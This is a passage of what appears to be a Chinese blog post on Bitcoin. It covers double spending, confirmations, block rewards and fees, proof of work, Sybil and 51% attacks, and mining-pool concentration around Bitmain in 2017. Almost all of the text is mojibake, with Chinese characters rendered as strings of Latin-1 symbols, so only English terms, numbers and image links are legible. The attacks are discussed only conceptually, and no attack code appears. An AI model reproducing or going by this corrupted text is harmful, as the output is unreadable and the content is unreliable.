<p>åœ¨Aliceåˆ›å»ºäº†åŒé‡æ”»å‡»çš„åŒºå—ä¹‹åï¼Œå¯¹äºå…¶ä»–çš„èŠ‚ç‚¹è€Œè¨€ï¼Œä¸¤ä¸ªåˆ†æ”¯å…·æœ‰ä¸€æ ·çš„é•¿åº¦ï¼›è€Œä¸”ä¸¤ä¸ªå—éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œé‚£ä¹ˆå…¶ä»–èŠ‚ç‚¹ä¼šé€‰æ‹©å“ªä¸ªåˆ†æ”¯å°±å†³å®šäº†æ”»å‡»æˆåŠŸä¸å¦ã€‚ä½†æ˜¯å¯¹äºå…¶ä»–çš„èŠ‚ç‚¹è€Œè¨€ï¼Œè¿™ä¸¤ä¸ªäº¤æ˜“çš„åœ°ä½æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚æˆ‘ä»¬è®¤ä¸ºAliceä»˜ç»™è‡ªå·±çš„äº¤æ˜“æ˜¯æ¬ºéª—ï¼Œé‚£æ˜¯å› ä¸ºæˆ‘ä»¬çŸ¥é“Aliceé¦–å…ˆä»˜ç»™äº†Bobã€‚ä½†æ˜¯ï¼Œå¯¹äºæ²¡æœ‰å…¨å±€æ—¶é—´çš„ç½‘ç»œè€Œè¨€ï¼Œè¿™ä¸¤ä¸ªäº¤æ˜“æ˜¯ç­‰ä»·çš„ã€‚è€Œä¸”Aliceè¿˜å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•ä½¿å¾—ä¸‹ä¸€ä¸ªåŒºå—æ²¿ç€è‡ªå·±çš„åˆ†æ”¯å»¶ä¼¸ã€‚</p>
<p>é‚£ä¹ˆBobå¦‚ä½•åº”å¯¹è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ</p>
<p>å¦‚æœBobå®¹æ˜“è½»ä¿¡ï¼Œé‚£ä¹ˆä»–å¯èƒ½åœ¨å‘ç°Aliceå‘å¸ƒäº†ä»˜å¸ç»™è‡ªå·±çš„æ—¶å€™å°±åŒæ„å°†è½¯ä»¶å‘ç»™Aliceï¼Œè¿™ä¸ªæ—¶å€™ï¼Œç§°ä½œZero-Confirmation Transactionï¼ˆé›¶ç¡®è®¤äº¤æ˜“ï¼‰ã€‚å¦‚æœBobæœ‰æ›´å¤šçš„ä¿æŠ¤è‡ªå·±çš„æ„è¯†ï¼Œä»–ä¼šç­‰åˆ°Aliceä»˜é’±ç»™è‡ªå·±çš„äº¤æ˜“è¢«å¤šæ¬¡ç¡®è®¤ä¹‹åæ‰å°†è½¯ä»¶å‘ç»™Aliceã€‚å½“äº¤æ˜“è¢«åŒ…å«åœ¨åŒºå—ä¸­ï¼Œç§°ä½œä¸€æ¬¡ç¡®è®¤ï¼›å¦‚æœåŒ…å«äº¤æ˜“çš„åŒºå—ä¹‹ååˆæ¥äº†ä¸€ä¸ªåŒºå—ï¼Œç§°ä½œ2æ¬¡ç¡®è®¤ã€‚ä»¥æ­¤ç±»æ¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233998.jpg" alt="img"></p>
<p>åªè¦Bobç­‰è¶³å¤Ÿçš„æ—¶é—´ï¼Œé‚£ä¹ˆå½“ä»–å‘ç°åŒ…å«Aliceä»˜é’±ç»™è‡ªå·±çš„åŒºå—å·²ç»è¢«é—å¼ƒçš„æ—¶å€™ï¼Œä»–ä¼šæ”¾å¼ƒè¿™æ¬¡äº¤æ˜“å¹¶ä¸”æ‹’ç»å°†è½¯ä»¶å‘ç»™Aliceã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä¸€ä¸ªäº¤æ˜“è·å¾—çš„ç¡®è®¤è¶Šå¤šï¼Œè¿™ä¸ªäº¤æ˜“æˆä¸ºæœ€ç»ˆçš„ç³»ç»Ÿçš„å…±è¯†çš„æ¦‚ç‡è¶Šå¤§ã€‚</p>
<p>åœ¨æ¯”ç‰¹å¸ç³»ç»Ÿä¸­çš„ä¸€èˆ¬åšæ³•æ˜¯ç­‰6ä¸ªç¡®è®¤ã€‚6æ˜¯åœ¨ç­‰å¾…æ—¶é—´å’Œç¡®è®¤ä¹‹é—´çš„ä¸€ä¸ªæŠ˜ä¸­ã€‚</p>
<p>ç»¼ä¸Šï¼Œèƒ½å¤Ÿé˜²æ­¢åŒé‡æ”¯ä»˜æˆåŠŸçš„åŸå› ï¼Œä¹Ÿå³ï¼ŒåŒ…æ‹¬åŒé‡æ”¯ä»˜çš„åŒºå—ä¸èƒ½æœ€ç»ˆåŒ…æ‹¬åœ¨é“¾ä¸­çš„åŸå› æ˜¯æˆ‘ä»¬å‡è®¾å¤§éƒ¨åˆ†çš„èŠ‚ç‚¹æ˜¯è¯šå®çš„ã€‚ä»å¯†ç å­¦çš„è§’åº¦ï¼Œä¸¤ä¸ªäº¤æ˜“éƒ½æ˜¯æ­£ç¡®çš„ã€‚ æ‰€ä»¥ï¼Œä¸ºäº†ç¡®è®¤å½¢æˆäº†å…±è¯†ï¼Œéœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç¡®å®šæœ€ç»ˆåŒºå—é“¾ä¸­åˆ°åº•åŒ…å«äº†å“ªä¸€ä¸ªå—ã€‚è€Œä¸”ï¼Œéšç€åŒºå—çš„å¢åŠ ï¼ˆç¡®è®¤æ•°çš„å¢åŠ ï¼‰ï¼Œäº¤æ˜“å˜æ— æ•ˆçš„å¯èƒ½æ€§æ˜¯æŒ‡æ•°çº§é™ä½çš„ã€‚å› æ­¤ï¼Œå¯ä»¥ç­‰å¾…6ä¸ªåŒºå—ï¼Œä¹Ÿå³å·®ä¸å¤š1ä¸ªå°æ—¶çš„æ—¶é—´ï¼ŒåŸºæœ¬ä¸Šä¸ä¼šå†ç¿»ç›˜äº†ã€‚</p>
<p>æ¿€åŠ±å’Œå·¥ä½œè¯æ˜ï¼ˆPoWï¼‰</p>
<p>åœ¨ä¹‹å‰çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¤šæ¬¡åšäº†å‡è®¾ï¼Œå¤§éƒ¨åˆ†çš„èŠ‚ç‚¹æ˜¯è¯šå®èŠ‚ç‚¹â€”â€”è¯šå®çš„èŠ‚ç‚¹ä¼šå°†è‡ªå·±æ”¶åˆ°çš„å¹¿æ’­çš„äº¤æ˜“æ‰“åŒ…ï¼Œè¯šå®çš„èŠ‚ç‚¹ä¼šæ²¿ç€æœ€é•¿çš„åˆ†æ”¯æ‰©å±•ã€‚ä½†æ˜¯ï¼ŒèŠ‚ç‚¹æœ‰æ²¡æœ‰å¿…è¦ä¿æŒè¯šå®å‘¢ï¼Ÿæˆ–è€…è¯´ï¼Œèƒ½ä¸èƒ½ç»™èŠ‚ç‚¹æ¿€åŠ±ï¼Œè®©èŠ‚ç‚¹ç»´æŒè¯šå®ï¼Ÿ</p>
<p>å®é™…ä¸Šï¼Œå³ä½¿èƒ½å¤Ÿè¯æ˜æœ‰çš„èŠ‚ç‚¹æ­£åœ¨å°è¯•è¿›è¡ŒåŒé‡æ”¯ä»˜æ”»å‡»ï¼Œå› ä¸ºèŠ‚ç‚¹æ²¡æœ‰æ ‡è¯†ï¼Œæ‰€ä»¥å³ä½¿å‘ç°ï¼Œä¹Ÿä¸èƒ½è¿›è¡Œæƒ©ç½šã€‚æ‰€ä»¥ï¼Œé—®é¢˜å˜æˆäº†ï¼Œå¦‚æœèŠ‚ç‚¹ä¿æŒè¯šå®ï¼Œèƒ½ä¸èƒ½è·å¾—å¥–åŠ±ï¼ŸåŒæ ·çš„ï¼Œå› ä¸ºå¦‚æœèŠ‚ç‚¹æ²¡æœ‰èº«ä»½æ ‡è¯†ï¼Œä¸å¯èƒ½å¯„æ”¯ç¥¨ç»™è¯šå®çš„èŠ‚ç‚¹ï¼Œæ‰€ä»¥ï¼Œå¯¹è¯šå®çš„å½¢æˆåŒºå—çš„èŠ‚ç‚¹çš„å¥–åŠ±å°±æ˜¯æ¯”ç‰¹å¸ã€‚</p>
<p>åœ¨æ¯”ç‰¹å¸ç½‘ç»œä¸­ï¼Œå…±æœ‰ä¸¤ä¸ªæ¿€åŠ±æ–¹å¼ã€‚ä¸€ç§æ˜¯Block rewardï¼ˆåŒºå—å¥–åŠ±ï¼‰ï¼Œä¸€ç§æ˜¯transaction feesï¼ˆäº¤æ˜“è´¹ç”¨ï¼‰ã€‚</p>
<p>åŒºå—å¥–åŠ±æ˜¯è¿™æ ·çš„ï¼Œä»»ä½•åˆ›é€ å‡ºåŒºå—çš„èŠ‚ç‚¹å¯ä»¥åœ¨åŒºå—ä¸­åŒ…æ‹¬ä¸€ä¸ªç‰¹æ®Šçš„äº¤æ˜“â€”â€”åˆ›é€ å¸çš„äº¤æ˜“ï¼Œå¹¶ä¸”èŠ‚ç‚¹å¯ä»¥é€‰æ‹©äº¤æ˜“çš„æ¥æ”¶åœ°å€ã€‚å½“ç„¶ï¼Œ èŠ‚ç‚¹å¤§æ¦‚ç‡æŠŠæ¥æ”¶åœ°å€è®¾ç½®ä¸ºè‡ªå·±ã€‚å¯ä»¥ç†è§£ä¸ºè¿™æ˜¯å¯¹èŠ‚ç‚¹åˆ›é€ åŒºå—çš„å¥–åŠ±ã€‚</p>
<p>ç›®å‰ä¸ºæ­¢ï¼Œåˆ›é€ ä¸€ä¸ªåŒºå—çš„å¥–åŠ±æ˜¯25ä¸ªå¸ï¼Œç„¶åæ¯210,000ä¸ªåŒºå—è¿™ä¸ªæ•°å­—ä¼šå‡åŠã€‚æŒ‰ç…§ç”ŸæˆåŒºå—çš„é€Ÿåº¦ï¼Œå·®ä¸å¤šæ¯å››å¹´ï¼ŒåŒºå—å¥–åŠ±ä¼šå‡åŠã€‚</p>
<p>ç¬¬ä¸€çœ¼çœ‹æ¥ï¼Œè¿™ä¸ªå¥½åƒæ²¡ä»€ä¹ˆç”¨å¤„ã€‚å› ä¸ºï¼Œä¸ç®¡èŠ‚ç‚¹åˆ›é€ çš„æ˜¯å¥½çš„åŒºå—è¿˜æ˜¯åŒ…æ‹¬æ”»å‡»äº¤æ˜“çš„åŒºå—ï¼Œä»–éƒ½èƒ½è·å¾—å¥–åŠ±ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªå¥–åŠ±ä»€ä¹ˆæ—¶å€™æ‰æœ‰ç”¨å‘¢ï¼Ÿåªæœ‰åœ¨ä»–çš„åŒºå—è¢«åŒ…æ‹¬åœ¨é•¿é“¾ä¸­æ‰è¡Œã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªåŒºå—ä¸­åŒ…æ‹¬æ— æ•ˆçš„äº¤æ˜“ï¼Œè¿™ä¸ªåŒºå—ç›¸å½“äºä¼šè¢«ä¸¢å¼ƒã€‚æ‰€ä»¥ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹éƒ½èƒ½å°½åŠ›è¡¨ç°å¾—è¯šå®ï¼Œè¿™æ ·ï¼Œå…¶ä»–èŠ‚ç‚¹æ‰ä¼šæ²¿ç€ä»–çš„åŒºå—ç»§ç»­æ·»åŠ æ–°çš„åŒºå—ã€‚</p>
<p>åŒæ—¶ï¼ŒåŒºå—å¥–åŠ±ä¹Ÿæ˜¯å”¯ä¸€çš„åˆ›å»ºæ–°çš„æ¯”ç‰¹å¸çš„æ–¹æ³•ã€‚ä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºï¼Œæ¯å››å¹´æ¯”ç‰¹å¸çš„åŒºå—å¥–åŠ±é™ä½ä¸€åŠï¼Œæ¯”ç‰¹å¸ç³»ç»Ÿä¸­å¸çš„æ€»æ•°è®¾ç½®åœ¨21,000ï¼Œ000ã€‚ä¹Ÿå³ï¼Œæ€»æœ‰ä¸€å¤©ï¼Œåˆ›å»ºåŒºå—ä¸ä¼šäº§ç”Ÿæ–°çš„å¸ï¼Œæˆ–è€…å¸å›æŠ¥å¤ªå°‘ï¼Œè€Œæ²¡æœ‰äººæ„¿æ„å»åˆ›å»ºåŒºå—ã€‚</p>
<p>é‚£ä¸ªæ—¶å€™ï¼Œä¼šä¸ä¼šäº§ç”Ÿæ¬ºè¯ˆå‘¢ï¼Ÿ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233999.jpg" alt="img"></p>
<p><strong>äº¤æ˜“è´¹ç”¨ã€‚</strong>æ¯”ç‰¹å¸ä¸­çš„ç¬¬äºŒä¸ªæ¿€åŠ±æœºåˆ¶æ˜¯äº¤æ˜“è´¹ç”¨ã€‚äº¤æ˜“çš„åˆ›å»ºè€…å¯ä»¥åœ¨åˆ›å»ºäº¤æ˜“æ—¶ï¼Œè¾“å…¥å¤§äºè¾“å‡ºï¼Œå…¶ä¸­çš„å·®å€¼å°±æ˜¯äº¤æ˜“è´¹ç”¨ã€‚æ‰€ä»¥ï¼Œå³ä½¿å½“åˆ›å»ºåŒºå—ä¸ä¼šäº§ç”Ÿå¸çš„æ—¶å€™ï¼Œäº¤æ˜“è´¹ç”¨ä¼šå˜å¾—å¾ˆé‡è¦ã€‚åŒæ—¶ï¼Œå¯¹äºäº¤æ˜“è€…è€Œè¨€ï¼Œå¦‚æœå¸Œæœ›è‡ªå·±çš„äº¤æ˜“è¢«å¿«é€Ÿåœ°ç¡®è®¤ï¼Œæ¯«æ— ç–‘é—®åœ°ï¼Œåœ¨äº¤æ˜“ä¸­åŒ…æ‹¬å¤šä¸€ç‚¹çš„è´¹ç”¨æ˜¯ä¸€ä¸ªå¥½çš„æ–¹æ³•ã€‚</p>
<p>è¿™æ—¶å€™ï¼Œæ¥ç†ä¸€ä¸‹æ€è·¯ã€‚</p>
<ol>
<li>æˆ‘ä»¬è¦æ±‚åˆ›é€ æ–°åŒºå—çš„èŠ‚ç‚¹æ˜¯éšæœºçš„ã€‚</li>
<li>æˆ‘ä»¬ç»™åˆ›é€ åŒºå—çš„èŠ‚ç‚¹å¥–åŠ±ï¼Œé‚£æ ·ä¼šæœ‰å¾ˆå¤šèŠ‚ç‚¹å¸Œæœ›å‚ä¸ã€‚</li>
<li>ä»å‰ä¸¤ç‚¹è¿˜ä¼šå¼•å‡ºçš„é—®é¢˜æ˜¯ï¼šä¼šä¸ä¼šæœ‰èŠ‚ç‚¹å‘åŠ¨å¥³å·«æ”»å‡»ï¼Œåˆ›é€ å¾ˆå¤šçš„èŠ‚ç‚¹ä»¥è·å¾—å¥–åŠ±ï¼Ÿ</li>
</ol>
<p>æ‰€æœ‰ä¸‰ä¸ªé—®é¢˜çš„ç­”æ¡ˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªPoWï¼Œproof of workã€‚åŸºæœ¬æ€è·¯å°±æ˜¯ï¼ŒæŒ‘é€‰èŠ‚ç‚¹çš„æ—¶å€™ï¼Œè¦æ ¹æ®ä¸€ç§äººä»¬ä¸èƒ½ç‹¬å çš„èµ„æºæ¥é€‰æ‹©ï¼Œè­¬å¦‚ï¼Œç®—åŠ›ï¼Œcomputer powerã€‚åœ¨PoWä¸­ï¼Œå°±æ˜¯è®©èŠ‚ç‚¹è¿›è¡Œç«äº‰ï¼Œç®—åŠ›æœ€å¼ºèƒ½å¤Ÿèƒœå‡ºï¼Œä¹Ÿç›¸å½“äºæ˜¯æŒ‰ç…§ç®—åŠ›æŒ‰æ¯”ä¾‹è¿›è¡Œé€‰æ‹©ã€‚</p>
<p>ä»å¦ä¸€æ–¹é¢æ¥è®²ï¼Œè¿™å¯¹å¸Œæœ›å‚ä¸çš„èŠ‚ç‚¹è®¾ç½®äº†é—¨æ§›ï¼Œå¿…é¡»æœ‰è¶³å¤Ÿçš„ç®—åŠ›èµ„æºæ‰èƒ½å‚ä¸åˆ°åŒºå—çš„åˆ›å»ºä¸­ã€‚å› æ­¤ï¼Œå³ä½¿æœ‰äººæƒ³å‘åŠ¨Sybil Attackï¼Œå¦‚æœä¸èƒ½æ§åˆ¶æ›´å¤šçš„ç®—åŠ›ï¼Œåˆ›å»ºæ–°çš„èŠ‚ç‚¹æ˜¯æ²¡æœ‰ç”¨çš„ã€‚</p>
<p>æ¯”ç‰¹å¸çš„å·¥ä½œè¯æ˜å°±æ˜¯hash puzzlesã€‚ä¸ºäº†åˆ›å»ºä¸€ä¸ªåŒºå—ï¼ŒèŠ‚ç‚¹éœ€è¦èƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªæ•°å€¼ï¼Œnonceï¼Œä½¿å¾—å½“è®¡ç®—å“ˆå¸Œæ—¶ï¼Œå‰ä¸€ä¸ªhashï¼ŒåŒ…å«åœ¨åŒºå—ä¸­çš„äº¤æ˜“ï¼Œä»¥åŠnonceè¿™ä¸‰è€…è¿æ¥ä¹‹åï¼Œå®ƒçš„å“ˆå¸Œå€¼å°äºæŸä¸ªtargetã€‚</p>
<p>ç”¨å…¬å¼å†™å‡ºæ¥ï¼Œé•¿è¿™æ ·ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233000.jpg" alt="img"></p>
<p>ä¹‹å‰æˆ‘ä»¬è®²è¿‡hashå…·æœ‰çš„ç‰¹ç‚¹æ˜¯puzzle friendlinessï¼Œæ‰¾åˆ°è¿™ä¸ªNonceçš„å”¯ä¸€æ–¹æ³•å°±æ˜¯å°è¯•å„ç§å€¼ï¼Œç›´åˆ°è¿æ°”å¥½æ‰¾åˆ°ä¸€ä¸ªã€‚</p>
<p>å·¥ä½œè¯æ˜çš„å­˜åœ¨åŸºæœ¬ä¸Šå®ç°äº†å¯¹éšæœºæ€§çš„è¦æ±‚ï¼Œæ²¡æœ‰è°èƒ½å¤ŸæŒ‡å®šå“ªä¸ªèŠ‚ç‚¹å¯ä»¥äº§ç”Ÿä¸‹ä¸€ä¸ªåŒºå—ï¼›åŒæ—¶ï¼Œæ’é™¤äº†Sybil Attackçš„å¯èƒ½ï¼Œåˆ›å»ºæœ‰ç«äº‰åŠ›çš„èŠ‚ç‚¹ä»£ä»·å¤ªé«˜ã€‚</p>
<p>æ¯”ç‰¹å¸ä¸­çš„hashè®¡ç®—æœ‰ä¸‰ä¸ªç‰¹ç‚¹ã€‚</p>
<ol>
<li>å¾ˆéš¾è®¡ç®—ã€‚åœ¨2014å¹´ï¼Œäº§ç”Ÿä¸€ä¸ªåŒºå—éœ€è¦çš„è®¡ç®—å¤§æ¦‚æ˜¯ 10^20 æ¬¡å“ˆå¸Œã€‚é¢å¯¹è¿™æ ·çš„è®¡ç®—é‡ï¼Œæ™®é€šçš„ç¬”è®°æœ¬ç”µè„‘æ ¹æœ¬æ²¡æœ‰ç«äº‰åŠ›ã€‚ä¹Ÿå› æ­¤ï¼Œå‚ä¸è®¡ç®—çš„è¡Œä¸ºè¢«ç§°ä½œminingï¼ŒæŒ–çŸ¿ã€‚</li>
<li>éš¾åº¦å¯è°ƒèŠ‚ã€‚éš¾åº¦è°ƒæ•´é€»è¾‘è¢«å†™åœ¨ä»£ç ä¸­ï¼Œåœ¨æ¯ä¸ªå…¨èŠ‚ç‚¹ä¸­ç‹¬ç«‹è‡ªåŠ¨å‘ç”Ÿã€‚æ¯2016ä¸ªå—ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹ä¸€èµ·å‚ä¸è®¡ç®—ï¼Œé‡æ–°å®šä¹‰targetã€‚targetçš„ç›®æ ‡æ˜¯ï¼Œä½¿å¾—æ¯éš”10åˆ†é’Ÿæ‰èƒ½äº§ç”Ÿä¸€ä¸ªæ–°åŒºå—ã€‚æŒ‰ç…§è¿™ä¸ªé€Ÿåº¦ï¼Œæ¯ä¸¤å‘¨ï¼Œtargeté‡æ–°å®šä¹‰ä¸€æ¬¡ã€‚è¿™ä¹Ÿæ„å‘³ç€ï¼Œéšç€æ•´ä¸ªç³»ç»Ÿçš„ç®—åŠ›å¢åŠ ï¼Œ åˆ›å»ºä¸€ä¸ªåŒºå—ä¼šè¶Šæ¥è¶Šéš¾ã€‚ä¸ºä»€ä¹ˆéœ€è¦10åˆ†é’Ÿåˆ›å»ºä¸€ä¸ªåŒºå—å‘¢ï¼Ÿå¦‚æœä¸è‡ªåŠ¨è°ƒæ•´targetï¼Œéšç€ç®—åŠ›çš„å¢åŠ ï¼Œåˆ›å»ºåŒºå—çš„é€Ÿåº¦ä¼šè¶Šæ¥è¶Šå¿«ï¼Œå¯èƒ½æ‰“åŒ…çš„äº¤æ˜“ä¼šå˜å°‘ã€‚å½“ç„¶ï¼Œé€Ÿåº¦å¤ªæ…¢å°±ä¸é€‚åˆä¸€äº›ååé‡å¤§çš„æœåŠ¡ã€‚æ‰€ä»¥æœ€ä½³é€Ÿåº¦ä¸€ç›´æ˜¯ä¸ªé—®é¢˜ã€‚</li>
<li>éªŒè¯éå¸¸å®¹æ˜“ã€‚</li>
</ol>
<p>ä¹Ÿæ­£æ˜¯å› ä¸ºå·¥ä½œé‡è¯æ˜ï¼Œä¿è¯äº†å¦‚æœå¤§éƒ¨åˆ†çš„èŠ‚ç‚¹ï¼ˆä»¥ç®—åŠ›è€Œä¸æ˜¯ä¸ªæ•°ï¼‰æ˜¯è¯šå®çš„ï¼Œé‚£ä¹ˆè‡³å°‘æœ‰50%çš„å¯èƒ½ï¼Œä¸‹ä¸€ä¸ªåŒºå—æ¥è‡ªäºè¯šå®çš„èŠ‚ç‚¹ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<p>æ¯ä¸ªäººéƒ½å¯ä»¥å‚ä¸æ¯”ç‰¹å¸åè®®ï¼Œè€Œä¸”ä¸éœ€è¦ç°å®ä¸–ç•Œçš„èº«ä»½ï¼Œåªè¦åˆ›å»ºä¸€å¯¹å…¬ç§é’¥å¯¹å°±è¡Œã€‚è€Œä¸”å¯ä»¥åˆ›å»ºä»»æ„å¤šçš„å…¬ç§é’¥ã€‚äº¤æ˜“å®é™…ä¸Šå°±æ˜¯åœ¨ç½‘ç»œä¸­å¹¿æ’­çš„ä¿¡æ¯ã€‚æ¯”ç‰¹å¸å°±æ˜¯äº¤æ˜“çš„è¾“å‡ºã€‚ï¼ˆæ¯”ç‰¹å¸çš„æœ€å°å•ä½æ˜¯0.00000001ï¼Œå•ä½ä¸º1èªSatoshiï¼‰æ¯”ç‰¹å¸ç½‘ç»œçš„ç›®æ ‡æ˜¯å°†äº¤æ˜“å’Œæ–°åŒºå—å‘å…¨ç½‘å¹¿æ’­ï¼Œç½‘ç»œé€šè¿‡åŒºå—é“¾å’Œå…±è¯†æœºåˆ¶ä¿éšœå®‰å…¨ã€‚å½“æˆ‘ä»¬è¯´äº¤æ˜“åŒ…æ‹¬åœ¨åŒºå—é“¾ä¸­ï¼Œå®é™…ä¸Šæ˜¯è¿™ä¸ªäº¤æ˜“è·å¾—äº†å¤šæ¬¡çš„ç¡®è®¤ã€‚</p>
<p>æœ€åï¼Œè®¨è®ºä¸€ä¸‹51%æ”»å‡»ã€‚</p>
<p>å› ä¸ºä¹‹å‰çš„å‡è®¾ä¸€ç›´æ˜¯å¤§éƒ¨åˆ†çš„èŠ‚ç‚¹æ˜¯è¯šå®çš„ï¼Œä¹Ÿå°±æ˜¯è‡³å°‘51%çš„èŠ‚ç‚¹æ˜¯è¯šå®çš„ã€‚é‚£ä¸‡ä¸€æ”»å‡»è€…æ§åˆ¶äº†51%çš„èŠ‚ç‚¹å‘¢ï¼Ÿæˆ–è€…è¯´ï¼Œæœ‰ä¸€ä¸ªè¶…çº§å¼ºå¤§çš„çŸ¿æ± ï¼Œæ§åˆ¶äº†51%çš„ç®—åŠ›å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥æ€è€ƒä¸€ä¸‹ï¼Œæ­¤æ—¶æ”»å‡»è€…å¯èƒ½å‘èµ·ä»€ä¹ˆæ”»å‡»ã€‚</p>
<p>æ”»å‡»è€…å¯èƒ½å·åˆ«äººçš„æ¯”ç‰¹å¸å—ï¼Ÿä¸èƒ½ã€‚é™¤éèƒ½ç ´è§£å¯†ç åŸºç¡€ï¼Œå¦åˆ™ä¸å¯èƒ½å·åˆ°åˆ«äººçš„å¸ã€‚å¦‚æœæ”»å‡»è€…æƒ³åœ¨åŒºå—ä¸­åŒ…æ‹¬è¿™ä¸ªç­¾åä¸æ­£ç¡®çš„å¸ï¼Œé‚£ä¹ˆå³ä½¿æœ‰51%çš„ç®—åŠ›æ§åˆ¶ï¼Œä¹Ÿä¸å¯èƒ½æ¨ç¿»å…±è¯†æœºåˆ¶ã€‚å³ä½¿æ”»å‡»è€…åˆ›é€ å‡ºäº†æœ€é•¿çš„é“¾ï¼Œä½†æ˜¯å‰©ä¸‹çš„å…¶ä»–è¯šå®èŠ‚ç‚¹ä¼šæ‹’ç»æ¥å—è¿™æ¡é“¾ï¼Œè€Œä¼šè‡ªå·±åˆ›é€ å¦ä¸€æ¡é“¾ï¼Œä¹Ÿå°±æ˜¯å‡ºç°äº†åˆ†å‰ã€‚å½“æ”»å‡»è€…æƒ³æŠŠå·æ¥çš„å¸èŠ±å‡ºå»æ—¶ï¼Œæ¥æ”¶æ–¹ä¹Ÿä¼šå› ä¸ºä¸é€‰æ‹©æ”»å‡»è€…åˆ›é€ çš„é“¾è€Œæ‹’ç»è¿™ä¸ªäº¤æ˜“ã€‚</p>
<p>æ”»å‡»è€…èƒ½ä¸èƒ½è¿›è¡ŒDoSæ”»å‡»ï¼Ÿå¦‚æœæ”»å‡»è€…ç‰¹åˆ«ä¸å–œæ¬¢Bobï¼Œé‚£ä¹ˆç¡®å®æœ‰å¯èƒ½Bobçš„äº¤æ˜“ä¸ä¼šå‡ºç°åœ¨æ‰€æœ‰çš„åŒºå—ä¸­ã€‚ä½†æ˜¯ï¼ŒBobçš„äº¤æ˜“å¯ä»¥è¢«å¹¿æ’­åˆ°ç½‘ç»œä¸­ï¼Œæ‰€ä»¥ï¼Œå³ä½¿Bobç¡®å®æ˜¯æ‹’ç»æœåŠ¡äº†ï¼Œä½†æ˜¯è‡³å°‘å¯¹äºè¯šå®èŠ‚ç‚¹è€Œè¨€ï¼Œèƒ½å¤Ÿå‘ç°æ”»å‡»å‘ç”Ÿäº†ã€‚</p>
<p>æœ€åï¼Œèƒ½å¦è¿›è¡ŒåŒé‡æ”¯ä»˜ç­‰å…¶ä»–å¯ä»¥ç ´ååŒºå—é“¾ä¿¡ä»»çš„æ”»å‡»å‘¢ï¼Ÿåœ¨51%çš„ç®—åŠ›æ§åˆ¶ä¸‹ï¼Œç¡®å®æœ‰å¯èƒ½ã€‚ä½†æ˜¯é‚£ä¸ªæ—¶å€™ï¼Œä¸€æ—¦äººä»¬å‘è§‰åˆ°æ¯”ç‰¹å¸ç½‘ç»œè¢«äººæ§åˆ¶ï¼Œè€Œä¸å†å¯ä¿¡ï¼Œé‚£ä¹ˆäººä»¬ä¼šä¸»åŠ¨æ”¾å¼ƒæ¯”ç‰¹å¸ï¼Œé‚£ä¹ˆæ¯”ç‰¹å¸çš„ä»·å€¼ä¼šç›´æ¥å´©æºƒã€‚è€Œæ”»å‡»è€…å‘¢ï¼Œè€ƒè™‘åˆ°æ§åˆ¶51%ç®—åŠ›çš„ä»£ä»·ï¼Œå‡ºç°è¿™ç§æƒ…å†µå°±ç›¸å½“äºæ‰€æœ‰çš„æŠ•èµ„éƒ½ä¼šæ‰“æ°´æ¼‚ã€‚</p>
<hr>
<p>æ¥çœ‹ä¸€ä¸‹é­”å¹»ç°å®ã€‚</p>
<p><strong>æ¯”ç‰¹å¤§é™†</strong>ï¼Œæ··è¿‡å¸åœˆæˆ–è€…æŒ–è¿‡çŸ¿çš„éƒ½çŸ¥é“ï¼Œ<strong>ä»–ä»¬æ˜¯ä¸–ç•Œä¸Šæœ€å¤§çš„çŸ¿æœºç”Ÿäº§å•†ï¼Œæ‹¥æœ‰ä¸–ç•Œä¸Šæœ€å¤§çš„çŸ¿æ± ä»¥åŠçŸ¿åœº</strong>ã€‚æ˜¯æ¯”ç‰¹å¸ä¸–ç•Œçš„å·¨æ— éœ¸ã€‚æ¯”ç‰¹å¤§é™†çš„ç®—åŠ›åˆ°åº•æœ‰å¤šå¤§å‘¢ï¼Ÿé€šè¿‡ä¸‹é¢çš„å…¨çƒç®—åŠ›å›¾æ¥ç®€å•åˆ†æä¸€ä¸‹ã€‚ã€ä¸‹å›¾æ˜¯2017å¹´11æœˆçš„æ—¶å€™ã€‘</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233001.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=http://BTC.com">http://BTC.com</a>å’ŒAntPoolæ˜¯æ¯”ç‰¹å¤§é™†çš„çŸ¿æ± ï¼Œè¿™ç‚¹å·²æ¯‹åº¸ç½®ç–‘ï¼Œä¸¤è€…ç›¸åŠ å·²ç»å å…¨çƒç®—åŠ›çš„32.37%ã€‚è€ŒViaBTCæœ‰æ¯”ç‰¹å¤§é™†çš„æŠ•èµ„ï¼ŒBTC.TOPåˆ™æ˜¯æ±Ÿå“å°”çš„ï¼Œä»–ä»¬ä¸æ¯”ç‰¹å¤§é™†åŸºæœ¬åŒä»‡æ•Œå¿¾ã€‚**è¿™4ä¸ªçŸ¿æ± åœ¨å›¾ä¸Šæ˜çœ¼ä¸€çœ‹å°±çŸ¥é“è¶…è¿‡äº†51%ã€‚å®ƒä»¬ç›¸åŠ ç®—åŠ›å æ¯”è¾¾åˆ°äº†62.28%**ï¼Œè¿˜ä¸ç®—å…¶å®ƒè”ç›Ÿçš„ç®—åŠ›ä»¥åŠäº‘ç®—åŠ›ç­‰ã€‚</p>
